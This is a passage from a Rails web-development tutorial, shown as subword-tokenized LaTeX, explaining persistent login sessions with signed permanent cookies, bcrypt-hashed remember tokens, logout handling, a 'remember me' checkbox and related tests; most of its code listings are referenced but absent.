▁You ▁may ▁recall ▁from ▁Section ~\ ref { sec : a _ class _ of _ our _ own } ▁that ▁Ruby ▁let s ▁you ▁add ▁methods ▁to ▁\ emph { any } ▁class , ▁even ▁built - in ▁one s .
▁In ▁that ▁section , ▁we ▁added ▁a ▁\ text tt { palindrome ?}\ ▁method ▁to ▁the ▁\ text tt { String } ▁class ▁( and ▁ discover ed ▁as ▁a ▁result ▁that ▁\ text tt {" de if i ed "} ▁is ▁a ▁ palindrome ), ▁and ▁we ▁also ▁saw ▁how ▁Rails ▁add s ▁a ▁\ text tt { blank ?}\ ▁method ▁to ▁class ▁\ text tt { Object } ▁( so ▁that ▁\ text tt {" ". blank ? }, ▁\ text tt {" ~ ". blank ? }, ▁and ▁\ text tt { nil . blank ?}\ ▁are ▁all ▁\ text tt { true }).
▁The ▁\ text tt { cookies . permanent } ▁method , ▁which ▁creates ▁`` permanent '' ▁cookies ▁with ▁an ▁ expiration ▁\ text tt { 20 . years . from \_ now }, ▁gives ▁yet ▁another ▁example ▁of ▁this ▁practice ▁through ▁one ▁of ▁Rails ' ▁\ emph { time ▁helpers }, ▁which ▁are ▁methods ▁added ▁to ▁\ text tt { F i x n um } ▁( the ▁base ▁class ▁for ▁integer s ) :
▁< n > ▁ $ ▁rails ▁console < n > ▁ >> ▁1. year . from _ now < n > ▁=> ▁Sun , ▁09 ▁A ug ▁20 15 ▁ 16 : 4 8 : 17 ▁UTC ▁ + 00:00 < n > ▁ >> ▁10 . week s . ago < n > ▁=> ▁S at , ▁31 ▁May ▁2014 ▁ 16 : 4 8 : 4 5 ▁UTC ▁ + 00:00
▁Rails ▁add s ▁other ▁helpers , ▁too :
▁< n > ▁ >> ▁1. k i lo by t e < n > ▁=> ▁10 2 4 < n > ▁ >> ▁5 . me g a by t es < n > ▁=> ▁5 2 4 2 88 0
▁These ▁are ▁useful ▁for ▁upload ▁validations , ▁making ▁it ▁easy ▁to ▁restrict , ▁say , ▁image ▁upload s ▁to ▁\ text tt { 5 . me g a by t es }.
▁A lthough ▁it ▁should ▁be ▁used ▁with ▁caution , ▁the ▁flexibility ▁to ▁add ▁methods ▁to ▁built - in ▁classes ▁allows ▁for ▁extra or dinarily ▁natural ▁addition s ▁to ▁plain ▁Ruby .
▁Inde ed , ▁much ▁of ▁the ▁ el eg ance ▁of ▁Rails ▁ ultimate ly ▁d er ive s ▁from ▁the ▁m all e ability ▁of ▁the ▁under ly ing ▁Ruby ▁language .
▁To ▁store ▁the ▁user ' s ▁id ▁in ▁the ▁cookies , ▁we ▁could ▁follow ▁the ▁pattern ▁used ▁with ▁the ▁\ k ode { session } ▁method ▁( Listing ~\ ref { code : log _ in _ function }) ▁using ▁something ▁like
▁Because ▁it ▁place s ▁the ▁id ▁as ▁plain ▁text , ▁this ▁method ▁expose s ▁the ▁form ▁of ▁the ▁application ' s ▁cookies ▁and ▁make s ▁it ▁easier ▁for ▁an ▁attacker ▁to ▁compromise ▁user ▁account s .
▁To ▁avoid ▁this ▁problem , ▁we ' ll ▁use ▁a ▁\ emph { signed } ▁cookie , ▁which ▁secure ly ▁encrypt s ▁the ▁cookie ▁before ▁ placing ▁it ▁on ▁the ▁browser :
▁Because ▁we ▁want ▁the ▁user ▁id ▁to ▁be ▁pair ed ▁with ▁the ▁ permanent ▁remember ▁token , ▁we ▁should ▁make ▁it ▁ permanent ▁as ▁well , ▁which ▁we ▁can ▁do ▁by ▁chain ing ▁the ▁\ k ode { signed } ▁and ▁\ k ode { permanent } ▁methods :
▁After ▁the ▁cookies ▁are ▁set , ▁on ▁subsequent ▁page ▁views ▁we ▁can ▁retrieve ▁the ▁user ▁with ▁code ▁like
▁where ▁\ k ode { cookies . signed [: user \_ id ]} ▁automatically ▁ de crypt s ▁the ▁user ▁id ▁\ line break ▁cookie .
▁We ▁can ▁the n ▁use ▁bcrypt ▁to ▁verify ▁that ▁\ k ode { cookies [: remember \_ token ]} ▁matches ▁the ▁\ k ode { remember \_ digest } ▁generated ▁in ▁Listing ~\ ref { code : user _ model _ remember }.
▁( In ▁case ▁you ' re ▁won d er ing ▁why ▁we ▁don ' t ▁just ▁use ▁the ▁signed ▁user ▁id , ▁without ▁the ▁remember ▁token , ▁this ▁would ▁allow ▁an ▁attacker ▁with ▁p o s session ▁of ▁the ▁encrypted ▁id ▁to ▁log ▁in ▁as ▁the ▁user ▁in ▁per p et u ity .
▁In ▁the ▁present ▁design , ▁an ▁attacker ▁with ▁both ▁cookies ▁can ▁log ▁in ▁as ▁the ▁user ▁only ▁un til ▁the ▁user ▁log s ▁out .)
▁The ▁final ▁piece ▁of ▁the ▁p u z z le ▁is ▁to ▁verify ▁that ▁a ▁given ▁remember ▁token ▁matches ▁the ▁user ' s ▁remember ▁digest , ▁and ▁in ▁this ▁context ▁there ▁are ▁a ▁couple ▁of ▁equivalent ▁ways ▁to ▁use ▁bcrypt ▁to ▁verify ▁a ▁match .
▁If ▁you ▁look ▁at ▁the ▁\ href { https :// github . com / rails / rails / blo b / master / active model / lib / active _ model / secure _ password . rb }{ secure ▁password ▁source ▁code }, ▁you ' ll ▁find ▁a ▁comparison ▁like ▁this
▁As ▁noted ▁in ▁Section ~\ ref { sec : a _ hash ed _ password }, ▁`` un encrypted ▁password '' ▁is ▁a ▁m is no m er , ▁as ▁the ▁secure ▁password ▁is ▁\ emph { hash ed }, ▁not ▁encrypted .
▁In ▁our ▁case , ▁the ▁analogous ▁code ▁would ▁look ▁like ▁this :
▁If ▁you ▁think ▁about ▁it , ▁this ▁code ▁is ▁really ▁strange : ▁it ▁appears ▁to ▁be ▁compar ing ▁a ▁bcrypt ▁password ▁digest ▁directly ▁with ▁a ▁token , ▁which ▁would ▁i mp ly ▁\ emph { de crypt ing } ▁the ▁digest ▁in ▁order ▁to ▁compare ▁using ▁\ k ode {==} .
▁But ▁the ▁whole ▁point ▁of ▁using ▁bcrypt ▁is ▁for ▁hash ing ▁to ▁be ▁ ir reversible , ▁so ▁this ▁can ' t ▁be ▁right .
▁Inde ed , ▁d ig g ing ▁into ▁the ▁\ href { https :// github . com / co d a ha le / bcrypt - ruby / blo b / master / lib / bcrypt / password . rb }{ source ▁code ▁of ▁the ▁bcrypt ▁gem } ▁verifie s ▁that ▁the ▁comparison ▁operator ▁\ k ode {==} ▁is ▁being ▁\ emph { re defined }, ▁and ▁under ▁the ▁hood ▁the ▁comparison ▁above ▁is ▁equivalent ▁to ▁the ▁following :
▁Instead ▁of ▁\ k ode {==} , ▁this ▁uses ▁the ▁boolean ▁method ▁\ k ode { is \_ password ?}\ ▁to ▁perform ▁the ▁comparison .
▁Because ▁its ▁meaning ▁is ▁a ▁little ▁clear er , ▁we ' ll ▁prefer ▁this ▁second ▁comparison ▁form ▁in ▁the ▁application ▁code .
▁The ▁above ▁discussion ▁suggest s ▁ putting ▁the ▁digest - - token ▁comparison ▁into ▁an ▁\ k ode { authenticated ?}\ ▁method ▁in ▁the ▁User ▁model , ▁which ▁ play s ▁a ▁similar ▁role ▁to ▁the ▁\ k ode { authenticate } ▁method ▁provided ▁by ▁\ k ode { has \_ secure \_ password } ▁for ▁ authenticating ▁a ▁user ▁( Listing ~\ ref { code : log _ in _ success }).
▁The ▁implementation ▁appears ▁in ▁Listing ~\ ref { code : authenticated _ p }.
▁( A lthough ▁the ▁\ k ode { authenticated ?}\ ▁method ▁in ▁Listing ~\ ref { code : authenticated _ p } ▁is ▁ti ed ▁specifically ▁to ▁the ▁remember ▁digest , ▁it ▁will ▁turn ▁out ▁to ▁be ▁useful ▁in ▁other ▁context s ▁as ▁well , ▁and ▁we ' ll ▁general ize ▁it ▁in ▁Chapter ~\ ref { cha : account _ activation _ and _ password _ reset }. )
▁ Adding ▁an ▁\ k ode { authenticated ?}\
▁( Because ▁the ▁argument ▁refer s ▁to ▁the ▁remember ▁token , ▁it ▁is ▁not ▁un common ▁to ▁use ▁a ▁method ▁argument ▁that ▁has ▁the ▁same ▁name .)
▁Also ▁note ▁the ▁use ▁of ▁the ▁\ k ode { remember \_ digest } ▁attribute , ▁which ▁is ▁the ▁same ▁as ▁\ k ode { self . remember \_ digest } ▁and , ▁like ▁\ k ode { name } ▁and ▁\ k ode { email } ▁in ▁Chapter ~\ ref { cha : modeling _ users }, ▁is ▁created ▁automatically ▁by ▁Active ▁Record ▁base d ▁on ▁the ▁name ▁of ▁the ▁corresponding ▁database ▁column ▁( Listing ~\ ref { code : add _ remember _ digest _ to _ users _ generated }).
▁We ' re ▁now ▁in ▁a ▁position ▁to ▁remember ▁a ▁logged - in ▁user , ▁which ▁we ' ll ▁do ▁by ▁adding ▁a ▁\ k ode { remember } ▁helper ▁to ▁go ▁along ▁with ▁\ k ode { log \_ in }, ▁as ▁show n ▁in ▁Listing ~\ ref { code : log _ in _ with _ remember }.
▁Logging ▁in ▁and ▁remember ing ▁a ▁user .
▁As ▁with ▁\ k ode { log \_ in }, ▁Listing ~\ ref { code : log _ in _ with _ remember } ▁def ers ▁the ▁real ▁work ▁to ▁the ▁Sessions ▁helper , ▁where ▁we ▁define ▁a ▁\ k ode { remember } ▁method ▁that ▁calls ▁\ k ode { user . remember }, ▁there by ▁ generating ▁a ▁remember ▁token ▁and ▁saving ▁its ▁digest ▁to ▁the ▁database .
▁It ▁the n ▁uses ▁\ k ode { cookies } ▁to ▁create ▁ permanent ▁cookies ▁for ▁the ▁user ▁id ▁and ▁remember ▁token ▁as ▁describe d ▁above .
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : remember _ method }
▁Re member ing ▁the ▁user .
▁With ▁the ▁code ▁in ▁Listing ~\ ref { code : remember _ method }, ▁a ▁user ▁logging ▁in ▁will ▁be ▁remember ed ▁in ▁the ▁sense ▁that ▁their ▁browser ▁will ▁get ▁a ▁valid ▁remember ▁token , ▁but ▁it ▁does n ' t ▁yet ▁do ▁us ▁any ▁good ▁because ▁the ▁\ k ode { current \_ user } ▁method ▁defined ▁in ▁Listing ~\ ref { code : current _ user } ▁know s ▁only ▁about ▁the ▁temporary ▁session :
▁In ▁the ▁case ▁of ▁ persistent ▁sessions , ▁we ▁want ▁to ▁retrieve ▁the ▁user ▁from ▁the ▁temporary ▁session ▁if ▁\ k ode { session [: user \_ id ]} ▁exists , ▁but ▁otherwise ▁we ▁should ▁look ▁for ▁\ k ode { cookies [: user \_ id ]} ▁to ▁retrieve ▁( and ▁log ▁in ) ▁the ▁user ▁corresponding ▁to ▁the ▁ persistent ▁session .
▁We ▁can ▁accomplish ▁this ▁as ▁follows :
▁in ▁Listing ~\ ref { code : find _ authenticate _ user }.
▁The ▁code ▁above ▁will ▁work , ▁but ▁note ▁the ▁repeated ▁use ▁of ▁both ▁\ k ode { session } ▁and ▁\ k ode { cookies }.
▁We ▁can ▁eliminate ▁this ▁duplication ▁as ▁follows :
▁This ▁uses ▁the ▁common ▁but ▁ potentially ▁confusing ▁construction
▁De s p ite ▁appearance s , ▁this ▁is ▁\ emph { not } ▁a ▁comparison ▁( which ▁would ▁use ▁double - equal s ▁\ k ode {==} ), ▁but ▁rather ▁is ▁an ▁\ emph { assignment }.
▁to ▁read
▁I ▁generally ▁use ▁the ▁convention ▁of ▁ putting ▁such ▁assignment s ▁in ▁parentheses , ▁which ▁is ▁a ▁ visual ▁remind er ▁that ▁it ' s ▁not ▁a ▁comparison .
▁Defin ing ▁the ▁\ k ode { current \_ user } ▁helper ▁as ▁discuss ed ▁above ▁lead s ▁to ▁the ▁implementation ▁show n ▁in ▁Listing ~\ ref { code : persistent _ current _ user }.
▁ Updating ▁\ k ode { current \_ user } ▁for ▁ persistent ▁sessions .
▁# ▁Return s ▁the ▁user ▁corresponding ▁to ▁the ▁remember ▁token ▁cookie .
▁With ▁the ▁code ▁as ▁in ▁Listing ~\ ref { code : persistent _ current _ user }, ▁new ly ▁logged ▁in ▁users ▁are ▁correctly ▁remember ed , ▁as ▁you ▁can ▁verify ▁by ▁logging ▁in , ▁ closing ▁the ▁browser , ▁and ▁check ing ▁that ▁you ' re ▁ still ▁logged ▁in ▁when ▁you ▁restart ▁the ▁sample ▁application ▁and ▁re visit ▁the ▁sample ▁application .
▁If ▁you ▁want , ▁you ▁can ▁even ▁ inspect ▁the ▁browser ▁cookies ▁to ▁see ▁the ▁result ▁directly ▁( F igure ~\ ref { fig : cookie _ in _ browser })
▁Google ▁`` < your ▁browser ▁name > ▁ inspect ▁cookies '' ▁to ▁learn ▁how ▁to ▁ inspect ▁the ▁cookies ▁on ▁your ▁system .
▁The ▁remember ▁token ▁cookie ▁in ▁the ▁local ▁browser .
▁There ' s ▁only ▁one ▁problem ▁with ▁our ▁application ▁as ▁it ▁stand s : ▁short ▁of ▁clear ing ▁their ▁browser ▁cookies ▁( or ▁wait ing ▁20 ▁ years ), ▁there ' s ▁no ▁way ▁for ▁users ▁to ▁log ▁out .
▁To ▁allow ▁users ▁to ▁log ▁out , ▁we ' ll ▁define ▁methods ▁to ▁ forget ▁users ▁in ▁analogy ▁with ▁the ▁one s ▁to ▁remember ▁them .
▁The ▁result ing ▁\ k ode { user . forget } ▁method ▁just ▁undo es ▁\ k ode { user . remember } ▁by ▁updating ▁the ▁remember ▁digest ▁with ▁\ k ode { nil }, ▁as ▁show n ▁in ▁Listing ~\ ref { code : user _ model _ forget }.
▁ Adding ▁a ▁\ k ode { forget } ▁method ▁to ▁the ▁User ▁model .
▁With ▁the ▁code ▁in ▁Listing ~\ ref { code : user _ model _ forget }, ▁we ' re ▁now ▁ready ▁to ▁ forget ▁a ▁ permanent ▁session ▁by ▁adding ▁a ▁\ k ode { forget } ▁helper ▁and ▁calling ▁it ▁from ▁the ▁\ k ode { log \_ out } ▁helper ▁( Listing ~\ ref { code : log _ out _ with _ forget }).
▁Logging ▁out ▁from ▁a ▁ persistent ▁session .
▁# ▁For get s ▁a ▁ persistent ▁session .
▁There ▁are ▁two ▁close ly ▁related ▁subtle t ies ▁left ▁to ▁address .
▁The ▁first ▁subtlety ▁is ▁that , ▁even ▁though ▁the ▁`` Log ▁out '' ▁link ▁appears ▁only ▁when ▁logged - in , ▁a ▁user ▁could ▁ potentially ▁have ▁multiple ▁browser ▁window s ▁open ▁to ▁the ▁site .
▁T hanks ▁to ▁reader ▁P a ul o ▁C é li o ▁ J ú n i or ▁for ▁point ing ▁this ▁out .
▁T hanks ▁to ▁reader ▁N i el s ▁ de ▁R on ▁for ▁point ing ▁this ▁out .
▁For ▁example , ▁suppose ▁that ▁the ▁user ▁log s ▁out ▁in ▁Firefox , ▁there by ▁setting ▁the ▁remember ▁digest ▁to ▁\ k ode { nil } ▁( via ▁\ k ode { user . forget } ▁in ▁Listing ~\ ref { code : user _ model _ forget }).
▁The ▁application ▁will ▁ still ▁work ▁in ▁Firefox ; ▁because ▁the ▁\ k ode { log \_ out } ▁method ▁in ▁Listing ~\ ref { code : log _ out _ with _ forget } ▁delete s ▁the ▁user ' s ▁id , ▁both ▁highlight ed ▁condition al s ▁are ▁\ k ode { false } :
▁As ▁a ▁result , ▁evaluat ion ▁f all s ▁off ▁the ▁end ▁of ▁the ▁\ k ode { current \_ user } ▁method , ▁there by ▁return ing ▁\ k ode { nil } ▁as ▁required .
▁Co n s equ ent ly , ▁the ▁in n er ▁\ k ode { if } ▁condition al ▁will ▁be ▁evaluated :
▁In ▁particular , ▁because ▁\ k ode { user } ▁is n ' t ▁\ k ode { nil }, ▁the ▁\ emph { second } ▁expression ▁will ▁be ▁evaluated , ▁which ▁raise s ▁an ▁error .
▁This ▁is ▁because ▁the ▁user ' s ▁remember ▁digest ▁was ▁deleted ▁as ▁part ▁of ▁logging ▁out ▁( Listing ~\ ref { code : user _ model _ forget }) ▁in ▁Firefox , ▁so ▁when ▁we ▁access ▁the ▁application ▁in ▁Chrome ▁we ▁end ▁up ▁calling
▁with ▁a ▁\ k ode { nil } ▁remember ▁digest , ▁there by ▁rais ing ▁an ▁exception ▁inside ▁the ▁bcrypt ▁library .
▁To ▁fix ▁this , ▁we ▁want ▁\ k ode { authenticated ?}\ ▁to ▁return ▁\ k ode { false } ▁instead .
▁These ▁are ▁exactly ▁the ▁sort s ▁of ▁subtle t ies ▁that ▁benefit ▁from ▁test - driven ▁development , ▁so ▁we ' ll ▁write ▁tests ▁to ▁catch ▁the ▁two ▁errors ▁before ▁correct ing ▁them .
▁from ▁Listing ~\ ref { code : user _ logout _ test } ▁to
▁as ▁show n ▁in ▁Listing ~\ ref { code : test _ do u b le _ logout }.
▁as ▁show n ▁in ▁Listing ~\ ref { code : destroy _ forget }.
▁On ly ▁logging ▁out ▁if ▁logged ▁in .
▁The ▁second ▁case , ▁ involving ▁a ▁scenario ▁with ▁two ▁different ▁browsers , ▁is ▁hard er ▁to ▁simul ate ▁with ▁an ▁integration ▁test , ▁but ▁it ' s ▁easy ▁to ▁check ▁in ▁the ▁User ▁model ▁test ▁directly .
▁All ▁we ▁need ▁is ▁to ▁start ▁with ▁a ▁user ▁that ▁has ▁no ▁remember ▁digest ▁( which ▁is ▁true ▁for ▁the ▁\ k ode {@ user } ▁variable ▁defined ▁in ▁the ▁\ k ode { setup } ▁method ) ▁and ▁the n ▁call ▁\ k ode { authenticated ? }, ▁as ▁show n ▁in ▁Listing ~\ ref { code : test _ authenticated _ invalid _ token }.
▁( Note ▁that ▁we ' ve ▁just ▁left ▁the ▁remember ▁token ▁blank ; ▁it ▁does n ' t ▁matter ▁what ▁its ▁value ▁is , ▁because ▁the ▁error ▁occur s ▁before ▁it ▁ever ▁get s ▁used .)
▁A ▁test ▁of ▁\ k ode { authenticated ?}\
▁To ▁fix ▁the ▁error ▁and ▁get ▁to ▁\ passing , ▁all ▁we ▁need ▁to ▁do ▁is ▁return ▁\ k ode { false } ▁if ▁the ▁remember ▁digest ▁is ▁\ k ode { nil }, ▁as ▁show n ▁in ▁Listing ~\ ref { code : authenticated _ p _ fixed }.
▁ Updating ▁\ k ode { authenticated ?}\
▁This ▁uses ▁the ▁\ k ode { return } ▁keyword ▁to ▁return ▁immediately ▁if ▁the ▁remember ▁digest ▁is ▁\ k ode { nil }, ▁which ▁is ▁a ▁common ▁way ▁to ▁emphasize ▁that ▁the ▁rest ▁of ▁the ▁method ▁get s ▁ignored ▁in ▁that ▁case .
▁The ▁equivalent ▁code
▁would ▁also ▁work ▁fine , ▁but ▁I ▁prefer ▁the ▁explicit n es s ▁of ▁the ▁version ▁in ▁Listing ~\ ref { code : authenticated _ p _ fixed } ▁( which ▁also ▁happens ▁to ▁be ▁slightly ▁short er ).
▁With ▁the ▁code ▁in ▁Listing ~\ ref { code : authenticated _ p _ fixed }, ▁our ▁full ▁test ▁suite ▁should ▁be ▁\ passing , ▁and ▁both ▁subtle t ies ▁should ▁now ▁be ▁address ed :
▁With ▁the ▁code ▁in ▁Section ~\ ref { sec : for getting _ users }, ▁our ▁application ▁has ▁a ▁complete , ▁p rofessional - grade ▁authentication ▁system .
▁As ▁a ▁final ▁step , ▁we ' ll ▁see ▁how ▁to ▁make ▁sta ying ▁logged ▁in ▁optional ▁using ▁a ▁`` remember ▁me '' ▁checkbox .
▁A ▁mockup ▁of ▁the ▁login ▁form ▁with ▁such ▁a ▁checkbox ▁appears ▁in ▁F igure ~\ ref { fig : login _ remember _ me _ mockup }.
▁A ▁mockup ▁of ▁a ▁`` remember ▁me '' ▁checkbox .
▁To ▁write ▁the ▁implementation , ▁we ▁start ▁by ▁adding ▁a ▁checkbox ▁to ▁the ▁login ▁form ▁from ▁Listing ~\ ref { code : login _ form }.
▁As ▁with ▁ label s , ▁text ▁fields , ▁password ▁fields , ▁and ▁submit ▁button s , ▁checkbox es ▁can ▁be ▁created ▁with ▁a ▁Rails ▁helper ▁method .
▁In ▁order ▁to ▁get ▁the ▁styling ▁right , ▁though , ▁we ▁have ▁to ▁\ emph { n est } ▁the ▁checkbox ▁inside ▁the ▁ label , ▁as ▁follows :
▁P utting ▁this ▁into ▁the ▁login ▁form ▁gives ▁the ▁code ▁show n ▁in ▁Listing ~\ ref { code : remember _ me _ checkbox }.
▁ Adding ▁a ▁`` remember ▁me '' ▁checkbox ▁to ▁the ▁login ▁form .
▁In ▁Listing ~\ ref { code : remember _ me _ checkbox }, ▁we ' ve ▁included ▁the ▁CSS ▁classes ▁\ k ode { checkbox } ▁and ▁\ k ode { in line }, ▁which ▁Bootstrap ▁uses ▁to ▁put ▁the ▁checkbox ▁and ▁the ▁text ▁( ` ` Re member ▁me ▁on ▁this ▁computer '') ▁in ▁the ▁same ▁line .
▁In ▁order ▁to ▁complete ▁the ▁styling , ▁we ▁need ▁just ▁a ▁few ▁more ▁CSS ▁rules , ▁as ▁show n ▁in ▁Listing ~\ ref { code : remember _ me _ css }.
▁The ▁result ing ▁login ▁form ▁appears ▁in ▁F igure ~\ ref { fig : login _ form _ remember _ me }.
▁CSS ▁for ▁the ▁`` remember ▁me '' ▁checkbox .
▁The ▁login ▁form ▁with ▁an ▁added ▁`` remember ▁me '' ▁checkbox .
▁Having ▁edit ed ▁the ▁login ▁form , ▁we ' re ▁now ▁ready ▁to ▁remember ▁users ▁if ▁they ▁check ▁the ▁checkbox ▁and ▁ forget ▁them ▁otherwise .
▁In credibly , ▁because ▁of ▁all ▁our ▁work ▁in ▁the ▁previous ▁section s , ▁the ▁implementation ▁can ▁be ▁reduce d ▁to ▁one ▁line .
▁We ▁start ▁by ▁noting ▁that ▁the ▁\ k ode { params } ▁hash ▁for ▁submitted ▁login ▁forms ▁now ▁includes ▁a ▁value ▁base d ▁on ▁the ▁checkbox ▁( as ▁you ▁can ▁verify ▁by ▁ submitting ▁the ▁form ▁in ▁Listing ~\ ref { code : remember _ me _ checkbox } ▁with ▁invalid ▁information ▁and ▁ inspect ing ▁the ▁values ▁in ▁the ▁debug ▁section ▁of ▁the ▁page ).
▁In ▁particular , ▁the ▁value ▁of
▁is ▁\ k ode { ' 1 ' } ▁if ▁the ▁box ▁is ▁check ed ▁and ▁\ k ode { ' 0 ' } ▁if ▁it ▁is n ' t .
▁By ▁testing ▁the ▁relevant ▁value ▁of ▁the ▁\ k ode { params } ▁hash , ▁we ▁can ▁now ▁remember ▁or ▁ forget ▁the ▁user ▁base d ▁on ▁the ▁value ▁of ▁the ▁submission
▁Note ▁that ▁this ▁means ▁un check ing ▁the ▁box ▁will ▁log ▁out ▁the ▁user ▁on ▁all ▁browsers ▁on ▁all ▁computer s .
▁The ▁alternate ▁design ▁of ▁remember ing ▁user ▁login ▁sessions ▁on ▁each ▁browser ▁in dependent ly ▁is ▁ potentially ▁more ▁convenient ▁for ▁users , ▁but ▁it ' s ▁less ▁secure , ▁and ▁is ▁also ▁more ▁complicated ▁to ▁implement .
▁A m b it ious ▁readers ▁are ▁in v it ed ▁to ▁try ▁their ▁hand ▁at ▁implement ing ▁it .
▁Before ▁we ▁wrote ▁\ k ode { remember ▁user } ▁without ▁parentheses , ▁but ▁when ▁used ▁with ▁the ▁ ternary ▁operator ▁omit ting ▁them ▁results ▁in ▁a ▁syntax ▁error .
▁ Adding ▁this ▁to ▁the ▁Sessions ▁controller ' s ▁\ k ode { create } ▁method ▁lead s ▁to ▁the ▁a ma z ing ly ▁compact ▁code ▁show n ▁in ▁Listing ~\ ref { code : remember _ me _ ternary }.
▁( N o w ▁you ' re ▁in ▁a ▁position ▁to ▁understand ▁the ▁code ▁in ▁Listing ~\ ref { code : digest _ method }, ▁which ▁uses ▁the ▁ ternary ▁operator ▁to ▁define ▁the ▁bcrypt ▁\ k ode { co st } ▁variable .)
▁H and l ing ▁the ▁submission ▁of ▁the ▁`` remember ▁me '' ▁checkbox .
▁With ▁the ▁implementation ▁in ▁Listing ~\ ref { code : remember _ me _ ternary }, ▁our ▁login ▁system ▁is ▁complete , ▁as ▁you ▁can ▁verify ▁by ▁check ing ▁or ▁un check ing ▁the ▁box ▁in ▁your ▁browser .
▁10 ▁types ▁of ▁people
▁There ' s ▁an ▁old ▁ j o k e ▁that ▁there ▁are ▁10 ▁kind s ▁of ▁people ▁in ▁the ▁world : ▁those ▁who ▁understand ▁bin ary ▁and ▁those ▁who ▁don ' t ▁( 10 , ▁of ▁course , ▁being ▁2 ▁in ▁bin ary ).
▁In ▁this ▁sp ir it , ▁we ▁can ▁say ▁that ▁there ▁are ▁10 ▁kind s ▁of ▁people ▁in ▁the ▁world : ▁those ▁who ▁like ▁the ▁ ternary ▁operator , ▁those ▁who ▁don ' t , ▁and ▁those ▁who ▁don ' t ▁yet ▁know ▁about ▁it .
▁( If ▁you ▁happen ▁to ▁be ▁in ▁the ▁third ▁ category , ▁soon ▁you ▁won ' t ▁be ▁any ▁longer .)
▁When ▁you ▁do ▁a ▁lot ▁of ▁programming , ▁you ▁quickly ▁learn ▁that ▁one ▁of ▁the ▁most ▁common ▁bit s ▁of ▁control ▁ flow ▁go es ▁something ▁like ▁this :
▁< n > ▁if ▁boolean ?
▁do _ one _ th ing
▁< n > ▁else
▁do _ something _ else
▁Ruby , ▁like ▁many ▁other ▁languages ▁( including ▁C / C ++ , ▁P er l , ▁P H P , ▁and ▁Java ), ▁allows ▁you ▁to ▁replace ▁this ▁with ▁a ▁much ▁more ▁compact ▁expression ▁using ▁the ▁\ emph { ternary ▁operator } ▁( so ▁called ▁because ▁it ▁consist s ▁of ▁three ▁parts ) :
▁< n > ▁boolean ? ▁ ?
▁do _ one _ th ing ▁: ▁do _ something _ else
▁You ▁can ▁also ▁use ▁the ▁ ternary ▁operator ▁to ▁replace ▁assignment , ▁so ▁that
▁var ▁= ▁ foo
▁var ▁= ▁bar
▁< n > ▁var ▁= ▁boolean ? ▁ ?
▁ foo ▁: ▁bar
▁F inally , ▁it ' s ▁often ▁convenient ▁to ▁use ▁the ▁ ternary ▁operator ▁in ▁a ▁function ' s ▁return ▁value :
▁< n > ▁def ▁ foo < n > ▁do _ stuff < n > ▁boolean ? ▁ ?
▁" bar " ▁: ▁" baz "
▁S ince ▁Ruby ▁ implicit ly ▁returns ▁the ▁value ▁of ▁the ▁last ▁expression ▁in ▁a ▁function , ▁here ▁the ▁\ text tt { foo } ▁method ▁returns ▁\ text tt {" bar "} ▁or ▁\ text tt {" baz "} ▁depending ▁on ▁whether ▁\ text tt { boolean ?}\ ▁is ▁\ text tt { true } ▁or ▁\ text tt { false }.
▁A lthough ▁our ▁`` remember ▁me '' ▁functionality ▁is ▁now ▁working , ▁it ' s ▁important ▁to ▁write ▁some ▁tests ▁to ▁verify ▁its ▁behavior .
▁One ▁reason ▁is ▁to ▁catch ▁implementation ▁errors , ▁as ▁discuss ed ▁in ▁a ▁moment .
▁Even ▁more ▁important , ▁though , ▁is ▁that ▁the ▁core ▁user ▁ persistence ▁code ▁is ▁in ▁fact ▁completely ▁un test ed ▁at ▁present .
▁Fix ing ▁these ▁issues ▁will ▁require ▁some ▁trick er y , ▁but ▁the ▁result ▁will ▁be ▁a ▁far ▁more ▁powerful ▁test ▁suite .
▁Testing ▁the ▁`` remember ▁me '' ▁box
▁When ▁I ▁original ly ▁implemented ▁the ▁checkbox ▁handling ▁in ▁Listing ~\ ref { code : remember _ me _ ternary }, ▁instead ▁of ▁the ▁correct
▁I ▁actually ▁used
▁In ▁this ▁context , ▁\ k ode { params [: session ] [: remember \_ me ]} ▁is ▁either ▁\ k ode { ' 0 ' } ▁or ▁\ k ode { ' 1 ' }, ▁both ▁of ▁which ▁are ▁\ k ode { true } ▁in ▁a ▁boolean ▁context , ▁so ▁the ▁result ing ▁expression ▁is ▁\ emph { always ▁true }, ▁and ▁the ▁application ▁act s ▁as ▁if ▁the ▁checkbox ▁is ▁always ▁check ed .
▁This ▁is ▁exactly ▁the ▁kind ▁of ▁error ▁a ▁test ▁can ▁catch .
▁Because ▁remember ing ▁users ▁requires ▁that ▁they ▁be ▁logged ▁in , ▁our ▁first ▁step ▁is ▁to ▁define ▁a ▁helper ▁to ▁log ▁users ▁in ▁inside ▁tests .
▁In ▁Listing ~\ ref { code : user _ login _ test _ valid _ information }, ▁we ▁logged ▁a ▁user ▁in ▁using ▁the ▁\ k ode { post } ▁method ▁and ▁a ▁valid ▁\ k ode { session } ▁hash , ▁but ▁it ' s ▁cumbersome ▁to ▁do ▁this ▁every ▁time .
▁To ▁avoid ▁need less ▁repetition , ▁we ' ll ▁write ▁a ▁helper ▁method ▁called ▁\ k ode { log \_ in \_ as } ▁to ▁log ▁in ▁for ▁us .
▁Ou r ▁method ▁for ▁logging ▁a ▁user ▁in ▁depend s ▁on ▁the ▁type ▁of ▁test . ▁In side ▁integration ▁tests , ▁we ▁can ▁post ▁to ▁the ▁sessions ▁path ▁as ▁in ▁Listing ~\ ref { code : user _ login _ test _ valid _ information }, ▁but ▁in ▁other ▁tests ▁( such ▁as ▁controller ▁and ▁model ▁tests ) ▁this ▁won ' t ▁work , ▁and ▁we ▁need ▁to ▁manipulate ▁the ▁\ k ode { session } ▁method ▁directly .
▁As ▁a ▁result , ▁\ k ode { log \_ in \_ as } ▁should ▁detect ▁the ▁kind ▁of ▁test ▁being ▁used ▁and ▁a d j us t ▁according ly .
▁We ▁can ▁tell ▁the ▁difference ▁between ▁integration ▁tests ▁and ▁other ▁kind s ▁of ▁tests ▁using ▁Ruby ' s ▁convenient ▁\ k ode { defined ?}\ ▁method , ▁which ▁returns ▁true ▁if ▁its ▁argument ▁is ▁defined ▁and ▁false ▁otherwise .
▁In ▁the ▁present ▁case , ▁the ▁\ k ode { post \_ via \_ redirect } ▁method ▁( see n ▁before ▁in ▁Listing ~\ ref { code : a _ test _ for _ valid _ submission }) ▁is ▁available ▁only ▁in ▁integration ▁tests , ▁so ▁the ▁code
▁will ▁return ▁\ k ode { true } ▁inside ▁an ▁integration ▁test ▁and ▁false ▁otherwise .
